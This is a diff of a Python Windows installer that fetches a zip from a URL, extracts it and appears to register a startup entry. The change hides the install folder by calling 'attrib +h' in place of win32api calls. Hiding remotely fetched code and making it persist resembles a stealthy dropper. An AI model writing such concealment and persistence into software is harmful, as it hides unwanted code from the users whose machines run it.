@@ -1,4 +1,4 @@
-import os,sys,time,subprocess,shutil,requests,random,win32api,win32con,json,winreg
+import os,sys,time,subprocess,shutil,requests,random,json,winreg
 from zipfile import ZipFile
 from getpass import getuser
 
@@ -63,7 +63,6 @@ def install_zip(url_zip):
     attrib.communicate()
     with ZipFile(name,"r") as zip:
         zip.extract("kraken_config.json")
-        win32api.SetFileAttributes("kraken_config.json",win32con.FILE_ATTRIBUTE_HIDDEN)
 
 def add_startup(install_path,main_file):
     path=f"{install_path}{main_file}".replace("/","\\")
@@ -104,7 +103,10 @@ def main(url_zip):
         zip.extractall(install_path)
     os.remove(name)
     os.remove("kraken_config.json")
-    win32api.SetFileAttributes(f"{install_path}",win32con.FILE_ATTRIBUTE_HIDDEN)
+    
+    attrib=subprocess.Popen(["attrib","+h",f"{install_path}"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    attrib.communicate()
+    
     if typ=="py" and requirements_file!="None":
         print("Download requirements")
         install_req(pip_path,install_path,requirements_file)
